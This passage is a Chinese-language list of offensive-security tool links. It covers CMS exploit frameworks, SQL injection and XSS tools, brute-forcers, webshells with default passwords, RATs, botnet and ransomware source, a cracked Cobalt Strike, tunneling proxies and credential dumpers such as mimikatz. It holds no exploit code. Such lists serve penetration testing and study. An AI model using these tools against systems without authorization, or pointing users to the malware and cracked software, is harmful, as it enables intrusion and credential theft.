web应用指纹识别</span><br><span class="line">https://github.com/nanshihui/Scan-T 网络爬虫式指纹识别</span><br><span class="line">https://github.com/ywolf/F-MiddlewareScan 中间件扫描服务识别</span><br><span class="line">https://github.com/lietdai/doom thorn上实现的分布式任务分发的ip端口漏洞扫描器</span><br><span class="line">https://github.com/RASSec/RASscan 端口服务扫描</span><br><span class="line">https://github.com/m3liot/shcheck 用于检查web服务的http header的安全性</span><br><span class="line">https://github.com/mozilla/ssh_scan 服务器ssh配置信息扫描</span><br><span class="line">https://github.com/18F/domain-scan 针对域名及其子域名的资产数据检测／扫描，包括http/https检测等</span><br><span class="line">https://github.com/ggusoft/inforfinder 域名资产收集及指纹识别工具</span><br><span class="line">https://github.com/0xbug/Howl 网络设备 web 服务指纹扫描与检索</span><br><span class="line">https://github.com/mozilla/cipherscan 目标主机服务ssl类型识别</span><br><span class="line">https://github.com/medbenali/CyberScan 渗透测试辅助工具，支持分析数据包、解码、端口扫描、IP地址分析等</span><br><span class="line">https://github.com/jekyc/wig web应用信息搜集工具</span><br><span class="line">https://github.com/eldraco/domain_analyzer 围绕web服务的域名进行信息收集和&quot;域传送&quot;等漏洞扫描，也支持针对背后的服务器端口扫描等</span><br><span class="line">https://github.com/cloudtracer/paskto 基于Nikto扫描规则的被动式路径扫描以及信息爬虫</span><br><span class="line">https://github.com/zerokeeper/WebEye 快速识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架</span><br><span class="line">https://github.com/n4xh4ck5/CMSsc4n CMS指纹识别</span><br><span class="line">https://github.com/HA71/WhatCMS CMS检测和漏洞利用脚本, 基于Whatcms.org API</span><br><span class="line">https://github.com/boy-hack/gwhatweb CMS识别 python gevent实现</span><br><span class="line">https://github.com/wpscanteam/wpscan 基本算是word press下最好用的工具了</span><br><span class="line">https://github.com/swisskyrepo/Wordpresscan 基于WPScan以及WPSeku的优化版wordpress扫描器</span><br><span class="line">https://github.com/m4ll0k/WPSeku 精简的wordpress扫描工具</span><br><span class="line">https://github.com/rastating/wordpress-exploit-framework wordpress漏洞利用框架</span><br><span class="line">https://github.com/Jamalc0m/wphunter php，wordpress扫描器</span><br><span class="line">https://github.com/UltimateLabs/Zoom wordpress漏洞扫描器</span><br><span class="line">https://github.com/immunIT/drupwn Drupal 信息收集与漏洞利用工具</span><br><span class="line">https://github.com/CHYbeta/cmsPoc CMS渗透测试框架</span><br><span class="line">https://github.com/chuhades/CMS-Exploit-Framework CMS攻击框架</span><br><span class="line">https://github.com/Tuhinshubhra/CMSeeK 20多种CMS的基本检测，针对wp利用、可定制模块化爆破功能</span><br><span class="line">https://github.com/Dionach/CMSmap 支持WordPress，Joomla和Drupal扫描</span><br><span class="line">https://github.com/Moham3dRiahi/XAttacker Web CMS Exploit 工具,包含针对主流 CMS 的 66 个不同的 Exploits</span><br><span class="line">https://github.com/code-scan/dzscan 首款集成化的Discuz扫描工具</span><br></pre></td></tr></table></figure><h2 id="数据库扫描与爆破"><a href="#数据库扫描与爆破" class="headerlink" title="数据库扫描与爆破"></a><strong>数据库扫描与爆破</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ron190/jsql-injection Java 编写的SQL注入工具</span><br><span class="line">https://github.com/shack2/SuperSQLInjectionV1 安恒航牛的一款界面化注入工具</span><br><span class="line">https://github.com/sqlmapproject/sqlmap sql注入sqlmap</span><br><span class="line">https://github.com/stamparm/DSSS 已用1,99行代码实现的sql注入漏洞扫描器</span><br><span class="line">https://github.com/Hadesy2k/sqliv 已用1,基于搜索引擎的批量SQL注入漏洞扫描器</span><br><span class="line">https://github.com/quentinhardy/odat 一款专门用于Oracle渗透的很全面的工具</span><br><span class="line">https://github.com/m8r0wn/enumdb MySQL和MSSQL利用工具后期爆破、搜索数据库并提取敏感信息。</span><br><span class="line">https://github.com/LoRexxar/Feigong 针对各种情况自由变化的MySQL注入脚本</span><br><span class="line">https://github.com/youngyangyang04/NoSQLAttack 一款针对mongoDB的攻击工具</span><br><span class="line">https://github.com/Neohapsis/bbqsql SQL盲注利用框架</span><br><span class="line">https://github.com/NetSPI/PowerUpSQL 基于Powershell的sqlserver测试框架</span><br><span class="line">http://www.4hou.com/system/14950.html 利用PowerUpSQL，渗透测试技巧：绕过SQL Server登录触发器限制</span><br><span class="line">https://github.com/WhitewidowScanner/whitewidow 一款数据库扫描器</span><br><span class="line">https://github.com/stampery/mongoaudit MongoDB审计及渗透工具</span><br><span class="line">https://github.com/torque59/Nosql-Exploitation-Framework NoSQL扫描/爆破工具</span><br><span class="line">https://github.com/missDronio/blindy MySQL盲注爆破工具</span><br><span class="line">https://github.com/JohnTroony/Blisqy 用于http header中的时间盲注爆破工具，仅针对MySQL/MariaDB</span><br><span class="line">https://github.com/se55i0n/DBScanner 自动扫描内网中常见sql、no-sql数据库脚本，包含未授权访问及常规弱口令检测</span><br><span class="line">https://github.com/Turr0n/firebase 对没有正确配置的firebase数据库进行利用</span><br></pre></td></tr></table></figure><h2 id="XSS跨站脚本检测利用"><a href="#XSS跨站脚本检测利用" class="headerlink" title="XSS跨站脚本检测利用"></a><strong>XSS跨站脚本检测利用</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/UltimateHackers/AwesomeXSS XSS Awesome系列</span><br><span class="line">http://www.xss-payloads.com 很全面的xss工具包与资料</span><br><span class="line">https://github.com/ismailtasdelen/xss-payload-list XSS 漏洞Payload列表</span><br><span class="line">https://github.com/beefproject/beef 经典的xss利用框架</span><br><span class="line">https://github.com/samdenty99/injectify 类似beef的xss利用框架</span><br><span class="line">https://github.com/firesunCN/BlueLotus_XSSReceiver 蓝莲花战队为CTF打造的xss利用框架</span><br><span class="line">https://github.com/NytroRST/XSSFuzzer 根据特定标签生成xss payload</span><br><span class="line">https://github.com/evilcos/xssor2 余弦写的xss利用辅助工具</span><br><span class="line">https://github.com/UltimateHackers/XSStrike 可识别并绕过WAF的XSS扫描工具</span><br><span class="line">https://github.com/raz-varren/xsshell go,利用xss漏洞返回一个js交互shell</span><br><span class="line">https://github.com/UltimateHackers/JShell 利用xss漏洞返回一个js交互shell</span><br><span class="line">https://github.com/shawarkhanethicalhacker/BruteXSS 一款XSS扫描器,可暴力注入参数</span><br><span class="line">https://github.com/1N3/XSSTracer 小型XSS扫描器,也可检测CRLF、XSS、点击劫持的</span><br><span class="line">https://github.com/0x584A/fuzzXssPHP PHP版本的反射型xss扫描</span><br><span class="line">https://github.com/chuhades/xss_scan 批量扫描XSS的python脚本</span><br><span class="line">https://github.com/BlackHole1/autoFindXssAndCsrf 自动化检测页面是否存在XSS和CSRF漏洞的浏览器插件</span><br><span class="line">https://github.com/shogunlab/shuriken 使用命令行进行XSS批量检测</span><br><span class="line">https://github.com/stamparm/DSXS 支持GET、POST方式的高效XSS扫描器</span><br><span class="line">https://github.com/bsmali4/xssfork kali下无法使用的话，请下载正确的PhantomJS到目录thirdparty/phantomjs/Linux</span><br><span class="line">https://github.com/riusksk/FlashScanner flash xss扫描</span><br><span class="line">https://github.com/Damian89/xssfinder 针对检测网站中的反射XSS</span><br><span class="line">https://github.com/BlackHole1/WebRtcXSS 自动化利用XSS入侵内网</span><br></pre></td></tr></table></figure><h2 id="弱口令扫描爆破"><a href="#弱口令扫描爆破" class="headerlink" title="弱口令扫描爆破"></a><strong>弱口令扫描爆破</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vanhauser-thc/thc-hydra 支持多种协议方式的破解与爆破，v8以后就不提供windows版本了</span><br><span class="line">https://github.com/nmap/ncrack c，支持多种协议的破解与爆破</span><br><span class="line">https://github.com/0pn1i9ht/F-Scrack ysrc对各类服务用户名密码爆破的脚本</span><br><span class="line">https://github.com/TunisianEagles/SocialBox 针对fb、gmail、ins、twitter的用户名密码爆破的脚本</span><br><span class="line">https://github.com/lanjelot/patator 支持多种协议的爆破，采用模块化设计，使用灵活</span><br><span class="line">https://github.com/m4ll0k/SMBrute 利用smb服务进行用户名密码爆破</span><br><span class="line">https://github.com/netxfly/crack_ssh Go写的协程版的ssh\redis\mongodb弱口令破解</span><br><span class="line">https://github.com/UltimateHackers/Blazy 支持测试 CSRF, Clickjacking, Cloudflare and WAF的弱口令探测器</span><br><span class="line">https://github.com/Moham3dRiahi/XBruteForcer WordPress、Joomla、DruPal、OpenCart、Magento等CMS用户密码爆破</span><br><span class="line">https://github.com/shengqi158/weak_password_detect Linux下利用nmap多线程探测ssh弱口令</span><br><span class="line">https://github.com/ztgrace/changeme 弱口令扫描器，不仅支持普通登录页，也支持ssh、mongodb等组件</span><br><span class="line">https://github.com/lijiejie/htpwdScan simple，http暴力破解、撞库攻击脚本</span><br><span class="line">https://github.com/scu-igroup/ssh-scanner 联动nmap、hydra对ssh批量爆破</span><br></pre></td></tr></table></figure><h2 id="密码破解还原"><a href="#密码破解还原" class="headerlink" title="密码破解还原"></a><strong>密码破解还原</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://securityxploded.com/download.php 各种密码方向安全小工具</span><br><span class="line">https://github.com/bdutro/ibm_pw_clear IBM x3550/x3560 M3 bios密码清除重置工具</span><br><span class="line">https://github.com/thehappydinoa/iOSRestrictionBruteForce py,实现的 ios 访问限制密码破解工具</span><br><span class="line">https://github.com/hashcat/hashcat C,哈希破解</span><br><span class="line">https://github.com/fireeye/gocrack GO,基于hashcat 3.6.0+的分布式密码破解工具</span><br><span class="line">https://github.com/s3inlc/hashtopolis 基于php的hashcat的分布式破解工具，支持C#与python客户端</span><br><span class="line">https://github.com/e-ago/bitcracker 首款开源的BitLocker密码破解工具</span><br><span class="line">https://www.ru.nl/publish/pages/909282/draft-paper.pdf 破解SSD下使用BitLocker的论文</span><br><span class="line">https://github.com/magnumripper/JohnTheRipper 已知密文的情况下尝试破解出明文的破解密码软件</span><br><span class="line">https://github.com/shinnok/johnny JohnTheRipper密码破解的GUI界面，理论兼容所有功能，有windows界面</span><br><span class="line">https://github.com/jmk-foofus/medusa 支持的协议会比hydra少一点，但是某些速度会快</span><br><span class="line">https://github.com/MrSqar-Ye/wpCrack wordpress hash破解</span><br><span class="line">https://github.com/testsecer/Md5Decrypt C#,基于网上web API的MD5搜索工具</span><br><span class="line">https://github.com/s0md3v/Hash-Buster 能调用多个API进行hash破解查询的智能工具</span><br><span class="line">https://www.52pojie.cn/thread-275945-1-1.html ARCHPR Pro4.54绿色中文破解版。压缩包密码破解，利用“已知明文攻击”破解加密的压缩文件</span><br></pre></td></tr></table></figure><h2 id="网站管理与Webshell"><a href="#网站管理与Webshell" class="headerlink" title="网站管理与Webshell"></a><strong>网站管理与Webshell</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">http://www.bt.cn 宝塔网站管理系统</span><br><span class="line">https://github.com/AntSwordProject/antSword js,中国蚁剑,插件式开发</span><br><span class="line">https://github.com/Chora10/Cknife java，中国菜刀</span><br><span class="line">https://github.com/naozibuhao/SecQuanCknife java，中国菜刀升级版，增加爆破功能</span><br><span class="line">https://github.com/euphrat1ca/hatchet 中国大砍刀</span><br><span class="line">https://github.com/tengzhangchao/PyCmd py，一句话木马客户端程序，目前支持php、jsp，CS端通信加密</span><br><span class="line">https://github.com/epinna/weevely3 py,利用特定的一句话脚本对网站进行管理</span><br><span class="line">https://github.com/nil0x42/phpsploit py3,利用特定的一句话脚本对网站进行管理</span><br><span class="line">https://github.com/wonderqs/Blade py，利用特定的一句话脚本对网站进行管理</span><br><span class="line">https://github.com/anestisb/WeBaCoo perl，利用特定的一句话脚本对网站进行管理</span><br><span class="line">https://github.com/keepwn/Altman .net配合mono，实现的跨平台菜刀</span><br><span class="line">https://github.com/k4mpr3t/b4tm4n 集成伪造邮件ddos，bat.php的webshell，初始k4mpr3t</span><br><span class="line">https://github.com/dotcppfile/DAws 过防火墙webshell，post pass=DAws</span><br><span class="line">https://github.com/b374k/b374k php网站管理，默认密码b374k</span><br><span class="line">https://github.com/wso-shell/WSO webshell的文件管理，可以伪装为404界面</span><br><span class="line">https://github.com/UltimateHackers/nano php小马，附带py编写的生成器</span><br><span class="line">https://github.com/rebeyond/memShell 一款可以写入java web server内存中的webshell</span><br><span class="line">https://github.com/DXkite/freebuf-stream-shell PHP使用流包装器实现WebShell。freebuf上有详细文章</span><br><span class="line">https://xz.aliyun.com/t/2799 利用动态二进制加密实现新型一句话木马之客户端篇</span><br><span class="line">https://github.com/rebeyond/Behinder “冰蝎”动态二进制加密网站管理客户端</span><br><span class="line">https://xz.aliyun.com/t/2744#toc-8 利用动态二进制加密实现新型一句话木马之Java篇</span><br><span class="line">https://xz.aliyun.com/t/2758#toc-4 利用动态二进制加密实现新型一句话木马之.NET篇</span><br><span class="line">https://xz.aliyun.com/t/2774#toc-4 利用动态二进制加密实现新型一句话木马之PHP篇</span><br></pre></td></tr></table></figure><h2 id="内网拓展后渗透"><a href="#内网拓展后渗透" class="headerlink" title="内网拓展后渗透"></a><strong>内网拓展后渗透</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/OpenWireSec/metasploit 后渗透框架</span><br><span class="line">https://github.com/EmpireProject/Empire 基于poweshell的命令执行框架</span><br><span class="line">https://github.com/TheSecondSun/Bashark 纯Bash脚本编写的后渗透框架，大鲨鱼</span><br><span class="line">https://github.com/JusticeRage/FFM py3，拥有下载、上传功能，生成可执行py脚本的后门的后渗透框架</span><br><span class="line">https://github.com/DarkSpiritz/DarkSpiritz py2,后渗透框架</span><br><span class="line">https://github.com/byt3bl33d3r/CrackMapExec 网络测试中的瑞士军刀，包含impacket、PowerSploit等多种模块</span><br><span class="line">https://github.com/SpiderLabs/scavenger 对CrackMapExec进行二次包装开发进行内网敏感信息扫描</span><br><span class="line">https://github.com/jmortega/python-pentesting python-pentesting-tool python安全工具相关功能模块</span><br><span class="line">https://github.com/0xdea/tactical-exploitation Python/PowerShell的测试脚本集</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit powershell测试脚本集与开发框架汇总</span><br><span class="line">https://github.com/samratashok/nishang powershell脚本集与利用框架</span><br><span class="line">https://github.com/PowerShellEmpire/PowerTools PowerShell脚本集，停止更新</span><br><span class="line">https://github.com/FuzzySecurity/PowerShell-Suite PowerShell脚本集</span><br><span class="line">https://github.com/rvrsh3ll/Misc-Powershell-Scripts PowerShell脚本集</span><br><span class="line">https://github.com/nccgroup/redsnarf 窃取哈希，密码解密，偷偷调用猕猴桃等程序，rdp多方法利用，远程启动shell，清楚痕迹</span><br><span class="line">https://github.com/BloodHoundAD/BloodHound 用于分析域成员和用用户关系的程序，通过用powershell脚本导出域内的session、computer、group、user等信息，入库后进行可视化分析可以做到定点攻击。</span><br><span class="line">https://github.com/xorrior/RemoteRecon 利用DotNetToJScript进行截图、key记录、token窃取、dll与恶意代码注入</span><br><span class="line">https://github.com/SkyLined/LocalNetworkScanner 利用浏览器漏洞当对方打开网址时，扫描对方内网信息</span><br><span class="line">https://github.com/fdiskyou/hunter 调用 Windows API 对内网信息进行搜集很全面</span><br><span class="line">https://github.com/0xwindows/VulScritp 内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等</span><br><span class="line">https://github.com/lcatro/network_backdoor_scanner 基于网络流量的内网探测框架</span><br><span class="line">https://github.com/sowish/LNScan 详细的内部网络信息扫描器</span><br><span class="line">https://github.com/rootlabs/nWatch 联动nmap，并对组织内网进行扫描</span><br><span class="line">https://github.com/m8r0wn/nullinux 用于Linux的内部渗透测试工具，可用于通过SMB枚举操作系统信息，域信息，共享，目录和用户。</span><br><span class="line">https://github.com/zMarch/Orc bash，Linux下后渗透命令集合</span><br></pre></td></tr></table></figure><h2 id="远程控制C2服务器"><a href="#远程控制C2服务器" class="headerlink" title="远程控制C2服务器"></a><strong>远程控制C2服务器</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/malwaredllc/byob 僵尸网络生成框架</span><br><span class="line">https://github.com/proxycannon/proxycannon-ng 构建攻击僵尸网络</span><br><span class="line">https://github.com/deadPix3l/CryptSky/ 勒索软件poc</span><br><span class="line">https://github.com/jgamblin/Mirai-Source-Code 蠕虫病毒poc</span><br><span class="line">https://github.com/AhMyth/AhMyth-Android-RAT 基于smali，Windows下安卓远控，一对多带界面</span><br><span class="line">https://github.com/ssooking/cobaltstrike3.12_cracked java1.8，远控、钓鱼、内网</span><br><span class="line">https://github.com/Mr-Un1k0d3r/ThunderShell py2，CLI与web端，内存马，RC4加密HTTP传输</span><br><span class="line">https://github.com/tiagorlampert/CHAOS go，win远控，可过大部分杀软</span><br><span class="line">https://github.com/Ne0nd0g/merlin go，c2通讯，一对多</span><br><span class="line">https://github.com/0x09AL/Browser-C2 go，利用chrome以浏览器的形式连接C2服务器</span><br><span class="line">https://github.com/xdnice/PCShare c++，可以监视目标机器屏幕、注册表、文件系统等</span><br><span class="line">https://github.com/quasar/QuasarRAT c#，一对多，界面</span><br><span class="line">https://github.com/TheM4hd1/Vayne-RaT c#，一对多，界面</span><br><span class="line">https://github.com/nettitude/PoshC2 PowerShell、C#，远控工具，有win提权组件</span><br><span class="line">https://github.com/euphrat1ca/njRAT-v0.7d vb，常见蠕虫远控，有很多变种，一对多带界面</span><br><span class="line">https://github.com/zerosum0x0/koadic py3,利用JScript/VBScript 进行控制，大宝剑</span><br><span class="line">https://github.com/Ridter/MyJSRat py2，利用js后门，配合chm、hta可实现很多后门方式。evi1cg.me/archives/chm_backdoor.html</span><br><span class="line">https://github.com/its-a-feature/Apfell py3，macOS与linux下的利用js后门，web界面管理</span><br><span class="line">https://github.com/peterpt/fuzzbunch py2，NSA漏洞利用工具，配有自动化安装脚本与gui界面，远控rat</span><br><span class="line">https://github.com/n1nj4sec/pupy py，Windows, Linux, OSX, Android跨平台，一对多</span><br><span class="line">https://github.com/nathanlopez/Stitch py，Windows、Mac OSX、Linux跨平台</span><br><span class="line">https://github.com/neoneggplant/EggShell py，macos/osx远控,可生成HID代码，一对多</span><br><span class="line">https://github.com/Marten4n6/EvilOSX py，macos/osx远控，一对多</span><br><span class="line">https://github.com/vesche/basicRAT py3，simple远控，一对多</span><br><span class="line">https://github.com/Viralmaniar/Powershell-RAT py，截图通过gmail传输</span><br><span class="line">https://github.com/byt3bl33d3r/gcat py，使用 gmail 作为 C&amp;C 服务器</span><br><span class="line">https://github.com/sweetsoftware/Ares py，c2通讯，支持代理</span><br><span class="line">https://github.com/micle-fm/Parat py，利用telegram，windows下的远程控制工具</span><br><span class="line">https://github.com/ahhh/Reverse_DNS_Shell py，通过dns传输</span><br><span class="line">https://github.com/iagox86/dnscat2 服务端为ruby（linux），客户端为C（win/linux），利用DNS协议进行端对端传输</span><br><span class="line">https://github.com/deepzec/Grok-backdoor py，利用ngrok的后门</span><br><span class="line">https://github.com/trustedsec/trevorc2 py，搭建一个合法的网站（可浏览），用于隐藏命令执行的客户端/服务器通信</span><br></pre></td></tr></table></figure><h2 id="端口转发与代理工具"><a href="#端口转发与代理工具" class="headerlink" title="端口转发与代理工具"></a><strong>端口转发与代理工具</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fatedier/frp 用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议</span><br><span class="line">https://github.com/inconshreveable/ngrok 端口转发，正反向代理，内网穿透</span><br><span class="line">http://ngrok.ciqiuwl.cn/ 在线小米球ngrok</span><br><span class="line">https://github.com/knownsec/rtcp Socket 端口转发，用于远程维护</span><br><span class="line">https://github.com/davrodpin/mole 基于ssh的端口转发</span><br><span class="line">http://rootkiter.com/EarthWorm 一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</span><br><span class="line">http://rootkiter.com/Termite/README.txt EarthWorm升级版，可以实现多节点跳跃</span><br><span class="line">https://github.com/SECFORCE/Tunna 可以通过HTTP封装隧道通信任何TCP，以及用于绕过防火墙环境中的网络限制</span><br><span class="line">https://github.com/fbkcs/thunderdns 将tcp流量通过DNS协议转发，不需要客户端和socket5支持</span><br><span class="line">https://github.com/sensepost/reGeorg reDuh 的升级版，主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口（提供了php，asp，jsp脚本的正反向代理）</span><br><span class="line">https://github.com/SpiderClub/haipproxy py3,Scrapy and Redis,高可用ip代理池</span><br><span class="line">https://github.com/chenjiandongx/async-proxy-pool py3异步爬虫ip代理池</span><br><span class="line">https://github.com/audibleblink/doxycannon 使用一个openvpn代理池，为每一个生成docker，当连接某一个vpn后，其它的进行socks5转发做流量分发</span><br><span class="line">https://github.com/decoder-it/psportfwd PowerShell编写的端口转发工具, 无需admin权限</span><br><span class="line">https://github.com/ls0f/gortcp go，通过主控端、中转、被控端实现内网穿透</span><br></pre></td></tr></table></figure><h2 id="Cross超越边界NPV"><a href="#Cross超越边界NPV" class="headerlink" title="Cross超越边界NPV"></a><strong>Cross超越边界NPV</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bannedbook/fanqiang/wiki cross汇总</span><br><span class="line">https://github.com/teddysun/across 梯子搭建</span><br><span class="line">https://github.com/ToyoDAdoubi/doubi 各种常用一键脚本</span><br><span class="line">https://github.com/Nyr/openvpn-install openvpn一键</span><br><span class="line">https://github.com/quericy/one-key-ikev2-vpn CentOS/Debian/Ubuntu一键安装IPSEC/IKEV2 VPN脚本</span><br><span class="line">https://github.com/teddysun/shadowsocks_install shadowsocks,shadowsocksr</span><br><span class="line">https://github.com/guyingbo/shadowproxy ss/socks5/http//https等多种代理</span><br><span class="line">https://github.com/shadowsocks/shadowsocks-manager shadowsocks多用户管理</span><br><span class="line">https://github.com/leitbogioro/SSR.Go shadowsocksrr配置管理简化工具</span><br><span class="line">https://github.com/ssrpanel/SSRPanel ss\ssr\v2ray用户分布式管理</span><br><span class="line">https://github.com/xuanhuan/ss-panel ss用户分布式管理</span><br><span class="line">https://github.com/Ahref-Group/SS-Panel-smarty-Edition ss用户分布式管理，兑换码功能、商城系统，服务器信息</span><br><span class="line">https://github.com/Ccapton/brook-web brook程序服务端Web后台管理服务器（Linux|MacOS），基于python、flask、flask-restful</span><br><span class="line">https://github.com/Ccapton/brook-ok Brook一键安装脚本</span><br><span class="line">https://github.com/txthinking/brook go，支持Linux/MacOS/Windows/Android/iOS的代理与vpn</span><br><span class="line">https://github.com/gwuhaolin/lightsocks 轻量级网络混淆代理，基于 SOCKS5 协议，类SS</span><br><span class="line">https://github.com/Umbrellazc/BypassCampusNet 校园网防断网; UDP 53 免流上网</span><br><span class="line">https://doub.io/dbrj-5/ 通过虚拟网卡转为类VPN全局代理SSTAP，还有sockscap64，比proxifier使用简单</span><br><span class="line">https://github.com/ntkernel/lantern unlimited-landeng-for-win，无限流量蓝灯</span><br><span class="line">https://www.psiphon3.com 开源赛风超越边界代理</span><br><span class="line">https://hide.me 可试用</span><br><span class="line">https://windscribe.com 可试用</span><br><span class="line">http://www.vpngate.net 日本国立筑波大学超越边界代理</span><br><span class="line">https://rava.app 注册可免费用一天</span><br></pre></td></tr></table></figure><h2 id="横向移动与密码Hash窃取"><a href="#横向移动与密码Hash窃取" class="headerlink" title="横向移动与密码Hash窃取"></a><strong>横向移动与密码Hash窃取</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://www.oxid.it/cain.html Cain &amp; Abel支持密码还原、arp中间人攻击</span><br><span class="line">https://github.com/gentilkiwi/mimikatz Windows下以抓取密码为主的横向移动神器</span><br><span class="line">https://github.com/skelsec/pypykatz 使用纯py3实现的mimikatz</span><br><span class="line">https://github.com/eladshamir/Internal-Monologue 无需LSASS进程使用Mimikatz从LSASS进程内存中提取内容, 从内存中提取明文密码, NTLM哈希, Kerberos ticket, 以及执行pass-the-hash/pass-the-ticket攻击等</span><br><span class="line">https://github.com/AlessandroZ/LaZagne py3，密码抓取工具</span><br><span class="line">https://github.com/AlessandroZ/LaZagneForensic LaZagne密码破解升级版，利用DPAPI，目前缺陷是需要windows user密码</span><br><span class="line">https://github.com/twelvesec/passcat Windows 下密码抓取工具</span><br><span class="line">https://github.com/huntergregal/mimipenguin linux密码抓取神器</span><br><span class="line">https://github.com/quarkslab/quarkspwdump quarkslab出品的密码抓取工具，不用注入任何进程</span><br><span class="line">https://github.com/mthbernardes/sshLooter 从ssh服务中窃取用户名密码</span><br><span class="line">https://github.com/nettitude/Invoke-PowerThIEf 利用IE进行后渗透，抓取密码、重定向等</span><br><span class="line">https://github.com/GhostPack/Rubeus 操作Kerberos的库, 实现了Kekeo的大部分功能, C#编写</span><br><span class="line">https://github.com/m8r0wn/ldap_search PY,通过ldap（轻量目录访问协议）认证，列举win域信息，爆破登录</span><br></pre></td></tr></table></figure><h2 id="Linux提权相关"><a href="#Linux提权相关" class="headerlink" title="Linux提权相关"></a><strong>Linux提权相关</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 